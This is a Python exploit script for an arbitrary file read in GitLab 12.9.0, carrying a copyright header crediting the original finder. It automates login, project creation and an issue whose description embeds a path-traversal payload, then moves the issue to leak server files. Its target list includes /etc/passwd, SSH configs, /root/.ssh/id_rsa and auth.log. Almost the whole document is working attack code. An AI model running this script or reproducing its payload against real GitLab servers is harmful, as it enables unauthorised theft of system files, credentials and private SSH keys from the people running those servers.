# Exploit Author: KouroshRZ
# Vendor Homepage: https://about.gitlab.com
# Software Link: https://about.gitlab.com/install
# Version: tested on gitlab version 12.9.0
# Tested on: Ubuntu 18.04 (but it&#039;s OS independent)
# CVE : -

#####################################################################################################
#                                                                                                   #			
# Copyright (c) 2020, William Bowling of Biteable, a.k.a vakzz                                      #
# All rights reserved.                                                                              #
#                                                                                                   #
# Redistribution and use in source and compiled forms, with or without modification, are permitted  #
# provided that the following conditions are met:                                                   #
#                                                                                                   #
#     * Redistributions of source code must retain the above copyright notice, this list of         # 
# conditions and the following disclaimer.                                                          #
#                                                                                                   #
#     * Redistributions in compiled form must reproduce the above copyright notice, this list of    #
# conditions and the following disclaimer in the documentation and/or other materials provided      #
# with the distribution.                                                                            #
#                                                                                                   #
#     * Neither the name of William Bowling nor the names of Biteable, a.k.a vakzz may be used to   #
# endorse or promote products derived from this software without specific prior written permission. #
#                                                                                                   #
##################################################################################################### 

# Exploit Title: automated exploit for Arbitrary file read via the UploadsRewriter when moving and issue in private gitlab server
# Google Dork: -
# Date: 05/03/2020
# Exploit Author: KouroshRZ
# Vendor Homepage: https://about.gitlab.com
# Software Link: https://about.gitlab.com/install
# Version: tested on gitlab version 12.9.0
# Tested on: Ubuntu 18.04 (but it&#039;s OS independent)
# CVE : -

import requests
import json
from time import sleep

# For debugging
proxies = {
    &#039;http&#039; : &#039;127.0.0.1:8080&#039;,
    &#039;https&#039; : &#039;127.0.0.1:8080&#039;
}

session = requests.Session()

# config
host = &#039;http[s]://<gitlab-address>&#039;
username = &#039;<you-gitlab-username>&#039;
password = &#039;<your-gitlab-password>&#039;
lastIssueUrl = ""

def loginToGitLab(username, password):

    initLoginUrl = &#039;{}/users/sign_in&#039;.format(host)

    initLoginResult = session.get(initLoginUrl).text

    temp_index_csrf_param_start = initLoginResult.find("csrf-param")
    temp_index_csrf_param_end = initLoginResult.find("/>", temp_index_csrf_param_start)
    csrf_param = initLoginResult[temp_index_csrf_param_start + 21 : temp_index_csrf_param_end - 2]

    temp_index_csrf_token_start = initLoginResult.find("csrf-token")
    temp_index_csrf_token_end = initLoginResult.find("/>", temp_index_csrf_token_start)
    csrf_token = initLoginResult[temp_index_csrf_token_start + 21 : temp_index_csrf_token_end - 2]

    # print("Took csrf toke ----> " + csrf_param + " : " + csrf_token + "\n")

    submitLoginUrl = &#039;{}/users/auth/ldapmain/callback&#039;.format(host)

    submitLoginData = {
        &#039;utf8=&#039; : &#039;✓&#039;,
        csrf_param : csrf_token,
        &#039;username&#039; : username,
        &#039;password&#039; : password,
    }

    submitLoginResult = session.post(submitLoginUrl, submitLoginData, allow_redirects=False)
    
    if submitLoginResult.status_code == 302 and submitLoginResult.text.find(&#039;redirected&#039;) > -1:
        print("[+] You&#039;e logged in ...")


def createNewProject(projectName):


    initProjectUrl = &#039;{}/projects/new&#039;.format(host)

    initProjectResult = session.get(initProjectUrl).text

    temp_index_csrf_param_start = initProjectResult.find("csrf-param")
    temp_index_csrf_param_end = initProjectResult.find("/>", temp_index_csrf_param_start)
    csrf_param = initProjectResult[temp_index_csrf_param_start + 21 : temp_index_csrf_param_end - 2]

    temp_index_csrf_token_start = initProjectResult.find("csrf-token")
    temp_index_csrf_token_end = initProjectResult.find("/>", temp_index_csrf_token_start)
    csrf_token = initProjectResult[temp_index_csrf_token_start + 21 : temp_index_csrf_token_end - 2]

    # print("Took csrf toke ----> " + csrf_param + " : " + csrf_token + "\n")

    tmp_index_1 = initProjectResult.find(&#039;{}/{}/\n&#039;.format(host, username))
    tmp_index_2 = initProjectResult.find(&#039;value&#039;, tmp_index_1)
    tmp_index_3 = initProjectResult.find(&#039;type&#039;, tmp_index_2)
    namespace = initProjectResult[tmp_index_2 + 7 : tmp_index_3 - 2]

    createProjectUrl = &#039;{}/projects&#039;.format(host)
    createProjectData = {
        &#039;utf8=&#039; : &#039;✓&#039;,
        csrf_param : csrf_token,
        &#039;project[ci_cd_only]&#039; : &#039;false&#039;,
        &#039;project[name]&#039; : projectName,
        &#039;project[namespace_id]&#039; : namespace,
        &#039;project[path]&#039; : projectName,
        &#039;project[description]&#039; : &#039;&#039;,
        &#039;project[visibility_level]&#039; : &#039;0&#039;
    }

    createProjectResult = session.post(createProjectUrl, createProjectData, allow_redirects=False)
    
    if createProjectResult.status_code == 302:

        print("[+] New Project {} created ...".format(projectName))

def createNewIssue(projectName, issueTitle, file):

    global lastIssueUrl

    initIssueUrl = &#039;{}/{}/{}/-/issues/new&#039;.format(host, username, projectName)

    initIssueResult = session.get(initIssueUrl).text

    temp_index_csrf_param_start = initIssueResult.find("csrf-param")
    temp_index_csrf_param_end = initIssueResult.find("/>", temp_index_csrf_param_start)
    csrf_param = initIssueResult[temp_index_csrf_param_start + 21 : temp_index_csrf_param_end - 2]

    temp_index_csrf_token_start = initIssueResult.find("csrf-token")
    temp_index_csrf_token_end = initIssueResult.find("/>", temp_index_csrf_token_start)
    csrf_token = initIssueResult[temp_index_csrf_token_start + 21 : temp_index_csrf_token_end - 2]

    # print("Took csrf toke ----> " + csrf_param + " : " + csrf_token + "\n")

    createIssueUrl = &#039;{}/{}/{}/-/issues&#039;.format(host , username, projectName)

    createIssueData = {
        &#039;utf8=&#039; : &#039;✓&#039;,
        csrf_param : csrf_token,
        &#039;issue[title]&#039; : issueTitle,
        &#039;issue[description]&#039; : &#039;![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../..{})&#039;.format(file),
        &#039;issue[confidential]&#039; : &#039;0&#039;,
        &#039;issue[assignee_ids][]&#039; : &#039;0&#039;,
        &#039;issue[label_ids][]&#039; : &#039;&#039;,
        &#039;issue[due_date]&#039; : &#039;&#039;,
        &#039;issue[lock_version]&#039; : &#039;0&#039;
    }

    createIssueResult = session.post(createIssueUrl, createIssueData, allow_redirects=False)

    if createIssueResult.status_code == 302:

        print("[+] New issue for {} created ...".format(projectName))
        tmp_index_1 = createIssueResult.text.find("href")
        tmp_index_2 = createIssueResult.text.find("redirected")
        lastIssueUrl = createIssueResult.text[tmp_index_1 + 6: tmp_index_2 - 2]
        print("[+] url of craeted issue : {}\n".format(lastIssueUrl))

def moveLastIssue(source, destination, file):

    # Get destination project ID

    getProjectIdUrl = &#039;{}/{}/{}&#039;.format(host, username, destination)
    getProjectIdResult = session.get(getProjectIdUrl).text

    tmpIndex = getProjectIdResult.find(&#039;/search?project_id&#039;)
    projectId = getProjectIdResult[tmpIndex + 19 : tmpIndex + 21]
    #print("Project : {} ID ----> {}\n".format(destination, projectId))

    # Get CSRF token for moving issue
    # initIssueMoveUrl = &#039;{}/{}/{}/-/issues/{}&#039;.format(host, username, source, issue)
    initIssueMoveUrl = lastIssueUrl
    initIssueMoveResult = session.get(initIssueMoveUrl).text

    temp_index_csrf_token_start = initIssueMoveResult.find("csrf-token")
    temp_index_csrf_token_end = initIssueMoveResult.find("/>", temp_index_csrf_token_start)
    csrf_token = initIssueMoveResult[temp_index_csrf_token_start + 21 : temp_index_csrf_token_end - 2]

    # print("Took csrf toke ----> " + csrf_param + " : " + csrf_token + "\n")

    # Move issue with associated CSRF token
    # moveIssueUrl = "{}/{}/{}/-/issues/{}/move".format(host, username, source, issue)
    moveIssueUrl = lastIssueUrl + "/move"
    moveIssueData = json.dumps({
        "move_to_project_id" : int(projectId)
    })
    headers = {
        &#039;X-CSRF-Token&#039; : csrf_token,
        &#039;X-Requested-With&#039; : &#039;XMLHttpRequest&#039;,
        &#039;Content-Type&#039; : &#039;application/json;charset=utf-8&#039;
    }
    moveIssueResult = session.post(moveIssueUrl, headers = headers, data = moveIssueData, allow_redirects = False)

    if moveIssueResult.status_code == 500:
        print("[!] Permission denied for {}".format(file))
    else:
        description = json.loads(moveIssueResult.text)["description"]
        tmp_index = description.find("/")
        fileUrl = "{}/{}/{}/{}".format(host, username, destination, description[tmp_index+1:-1])

        print("[+] url of file {}: \n".format(f, fileUrl))
        fileContentResult = session.get(fileUrl)

        if fileContentResult.status_code == 404:
            print("[-] No such file or directory : {}".format(f))
        else:
            print("[+] Content of file {} read from server ...\n\n".format(f))
            print(fileContentResult.text)
	    
    print("\n****************************************************************************************\n")



if __name__ == "__main__":

    loginToGitLab(username, password)

    createNewProject("project_01")
    createNewProject("project_02")

    # Put the files you want to read from server here
	# The files on server should have **4 or more permission (world readable files)
    files = {
        &#039;/etc/passwd&#039;,
        &#039;/etc/ssh/sshd_config&#039;,
        &#039;/etc/ssh/ssh_config&#039;,
        &#039;/root/.ssh/id_rsa&#039;,
        &#039;/var/log/auth.log&#039;
		# ...
		# ...
		# ...
    } 

    
    for f in files:
        createNewIssue("project_01", "issue01_{}".format(f), f)
        moveLastIssue("project_01", "project_02",f)
        sleep(3)

